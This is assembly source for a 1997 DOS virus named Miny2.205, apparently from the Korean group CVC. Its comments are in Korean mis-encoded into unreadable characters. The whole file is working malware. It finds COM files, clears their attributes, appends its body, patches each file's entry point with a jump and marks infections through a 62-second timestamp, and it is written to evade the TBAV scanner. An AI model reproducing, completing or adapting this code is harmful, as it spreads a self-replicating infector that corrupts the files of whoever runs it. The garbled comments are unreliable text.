;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Miny2.205 (Type C)
; Author : Osiris
; Group : CVC
; Date : 1997/08/17
;
; Type : Non-resident COM infector
;
; Miny2 (Type B) · ˆ¬åÌe·¡”a.
; COM ÑÂ¸w¸aŸi ˆa»¥ EXE Ìa·©·i ˆqµq ¯¡Ç¡»¡ ´g“e”a.
; ¤w¤ó·e EXE Ìa·©·e Àõ¦¦…·¡ MZ Ÿi ˆa»¡£a¡ Ð”wÌa·©·¡ MZ ¡ ¯¡¸bÐa¡e ˆqµq¯¡
; Ç¡»¡ ´g“e”a. ‹a¶A 64 KB ·¡¬w· ‹©·¡Ÿi ˆa»¡“e Ìa·©•¡ ˆqµq ¯¡Ç¡»¡ ´g“e”a.
; COM Ìa·©·e Ðaa· ­A‹a åËa e ¹¥¸Ða‹¡ ˜¢…µA 64 KB ·¡¬w· Ìa·©·e ¹¥¸ Ði ®
; ´ô”a.
;
; EXE Ìa·©·e COM Ìa·©‰Á“e Ìa·©Š¹¡ˆa ËiŸ¡‹¡ ˜¢…µA ˆqµq¯¡Ç¡‹¡ ¶áÐ¬á“e ™¡
; ”aŸe ¤w¤ó·¡ Ï©¶aÐa”a. ‹aœå•A ·©¦ EXE Ìa·©·e COM ÑÂ¸w¸aŸi ˆa»¥ ‰w¶ˆa ·¶”a.
; (µ:COMMAND.COM)
;  g·e ¤a·¡œá¯a—i·¡ ¶å•¡¶ 95µA¬á ¸b•··i ¹A”¡ ¡µÐa“e ·¡·Aº— Ðaaˆa COMMAND.
; COM ·i COM Ñw¯¢·a¡ ˆqµq¯¡Åa¬á Ìa·© Š¹¡Ÿi Œ¤áŸ¡“e ˜¢…·¡”a.
;
; µb¯¡  g·e AV —iµA‰A »¥”e·¡ –E”a. Ða»¡ e, Miny2 · ¡¢¸â·e §¡¬wº ‹¡¬—Ñw ¤a·¡œá
; ¯a ¹A¸b¤ó·¡‹¡ ˜¢…µA ´a»¢·e »¥”e·i Ï¡Ða‹¡ ¶áÐe ¤w¤ó·i ¬a¶wÐa»¡ ´g´v”a.
; Type D ¦Èá TBAV · ·¥‰·»¡“w·i Ï¡Ða“e ¤a·¡œá¯aŸi ¹A¸bÐa‰V”a.
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
            .MODEL  TINY
            .CODE

 Miny2:     nop                         ; ³aA‹¡ˆt (´a¢·©•¡ ´eÐe”a.)
            nop                         ; ´|¦¦… ¥¢Š¯¡ ¤a·¡œá¯aˆa ÌaŠA–A‹¡
            nop                         ; ˜¢…µA ·¡ ˆt·i ý´ö”a.
 start:
            call  Next                  ;
 Next:      pop   bp                    ;
            sub   bp,offset Next        ; BP = ¤a·¡œá¯a ¯¡¸b»¡¸ñ

            lea   si,COM_head[BP]       ;
            mov   di,100h               ; COM · ´|¦¦…·i ¥¢ŠÐe”a.
            push  di                    ;
            movsw                       ;
            movsb                       ;

            mov   cx,0080h              ; DTA ¡ ¬a¶wÐ PSP ˆa ÌaŠA–A£a¡
            mov   si,0080h              ; ¸q¯¡ ¸á¸wÐe”a.
            lea   di,End_Virus[BP]      ;
            repz  movsb                 ;

            mov   ah,4Eh                ; Ìa·© Àx‹¡
            mov   cx,00100011B
            lea   dx,Match_COM[BP]
 Find:      int   21h
            jnc   ChkInfected           ;
 Restart:
            lea   si,End_Virus[BP]      ; ¶¥œ DTA ¥¢Š
            mov   di,0080h
            mov   cx,0080h
            repz  movsb
            RET

 ChkInfected:                           ; ˆqµq µa¦Ÿi ÑÂ·¥Ðe”a.
            mov   al,DS:[0096h]         ; 62 Á¡ ·¥»¡ ˆñ¬aÐe”a.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
            mov   ah,4Fh                ; ”a·q Ìa·© Àx‹¡
            jmp   Find
 Infect:
            mov   ax,4301h              ; ·ª‹¡/³a‹¡ ­¢¬÷·a¡ ¤aŽ‘
            xor   cx,cx
            mov   dx,009Eh
            int   21h
            jc    Restart               ; µAœá¯¡ Ìa·© ”h‹¡

            mov   ax,3D02h              ; Ìa·© µ¡Ïe
            int   21h
            jc    Restart               ; Ñ¢¯¡ ¡¡Ÿi µ¡Ïe¯¡ µAœá•¡ ÀáŸ¡Ð–”a.

            xchg  ax,bx                 ; Ìa·© Ð…—i ´è‹¡

            mov   ax,5700h              ; Ìa·© ¸b¬÷ ¯¡ˆe ´è‹¡
            int   21h
            push  cx                    ; ¸b¬÷ ¯¡ˆe ¸á¸w
            push  dx                    ;

            mov   ah,3Fh                ; ´|¦¦… ·ª‹¡
            lea   dx,COM_Head[BP]       ; ¤áÌá º­¡
            mov   cx,0003               ; 3 ¤a·¡Ëa
            int   21h
            cmp   byte ptr COM_Head[BP],'M' ; MZ ·¥ˆa ?
            jnz   lseek2                ; TBAV µA »¥”e´e–A‹¡ ¶áÐ¬á ˜a¡ ˆñ¬a
            cmp   byte ptr COM_Head[BP+1],'Z' ; Ðe”a.
            jz    Error
 lseek2:
            mov   al,02                 ; Ìa·© {·a¡ ·¡•·
            call  lseek
            or    dx,dx                 ; 64 KB ·¡¬w·¥ˆa ?
            jnz   Error                 ; ”a·q ˆñ¬a˜ µ¡Ïe ¯¡Ç¡»¡ ´g‹¡¶áÐ¬á

            sub   ax,3                  ; ¸ñÏaˆt ‰¬e
            mov   word ptr JumpCode[BP+1],ax     ;

            mov   ah,40h                ; ¤a·¡œá¯a ³a‹¡
            mov   cx,offset End_virus - 3 - 2
            lea   dx,start[BP]
            int   21h

            mov   al,00                 ; Àá·q·a¡ ·¡•·
            call  lseek

            mov   ah,40h                ; ¸ñÏa Å¡—a ³a‹¡
            mov   cx,0003
            lea   dx,JumpCode[BP]
            int   21h

 Error:
            pop   dx                    ; Ìa·© ¸b¬÷ ¯¡ˆe ¥¢Š
            pop   cx                    ;
            or    cx,+1Fh               ; 62 Á¡¡  e—i‹¡
            mov   ax,5701h              ;
            int   21h

 Close:
            mov   ah,3Eh                ; Ìa·© ”h‹¡
            int   21h
            jmp   Restart

 lseek:                                 ; Í¡·¥Èá ·¡•·
            xor   cx,cx
            xor   dx,dx
            mov   ah,42h
            int   21h
            ret

 COM_head   db    0CDh,20h,90h          ; COM ´|¦¦…
 Match_COM  db    '*.com',00            ; COM Ìa·© Àx‹¡
            db    'Miny2'               ; £¡“¡ 2
 JumpCode   db    0E9h
            db    ?,?
 End_Virus:
            END   Miny2

